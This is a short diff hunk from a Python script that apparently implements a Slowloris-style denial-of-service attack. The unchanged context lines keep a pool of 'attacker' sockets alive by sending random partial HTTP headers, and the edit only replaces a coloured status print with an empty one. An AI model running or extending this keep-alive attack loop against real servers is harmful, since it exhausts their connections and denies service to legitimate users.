@@ -103,7 +103,7 @@ def main():
             logging.info("Keeping {} attacker connections alive.. ".format(len(attackers)))
             for s in list(attackers):
                 try:
-                    print("\033[48;5;7m\033[38;5;0mInfo attack\033[0m \033[38;5;2m"+id+" ")
+                    print("")
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
                 except socket.error as error:
                     logging.debug("Dead attacker: {} | Exception: {}".format(s.id, error))
